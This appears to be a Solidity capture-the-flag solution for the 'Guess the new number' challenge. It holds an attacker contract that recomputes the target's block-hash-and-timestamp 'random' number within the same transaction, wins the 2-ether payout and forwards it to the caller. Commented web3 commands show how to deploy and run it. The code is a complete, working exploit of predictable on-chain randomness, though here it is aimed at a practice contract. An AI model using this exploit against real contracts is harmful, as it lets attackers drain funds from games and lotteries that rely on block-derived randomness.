pragma solidity 0.4.21;

import './OtherContract.sol';

/*
const oneEth = web3.utils.toWei('1', 'ether');
var cheatTheNewNumber = await CheatTheNewNumber.deployed();
var balance = await cheatTheNewNumber.balance();
web3.utils.fromWei(balance);
await cheatTheNewNumber.guess({from: accounts[0], value: oneEth});
await cheatTheNewNumber.isComplete();

// ropsten balance
web3.eth.getBalance('0xd20FF949eb2A487823828B9E14Ab39cF8C31eb11')


// development balance
web3.eth.getBalance('0x3C5a99d8f3b559618e56D993E73f10e4406699d5')
*/

contract CheatTheNewNumber is OtherContract {

    function isComplete() public view returns (bool) {
        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);
        bool completed = guessTheNewNumberChallenge.isComplete();
        return completed;
    }

    function guess() public payable {
        require(otherContract != 0);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);
        guessTheNewNumberChallenge.guess.value(msg.value)(answer);
    }

    function balance() public view returns (uint256) {
        require(otherContract != 0);
        uint256 contractBalance = address(otherContract).balance;
        return contractBalance;
    }

    function() public payable { 
        msg.sender.transfer(address(this).balance);
    }
}

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
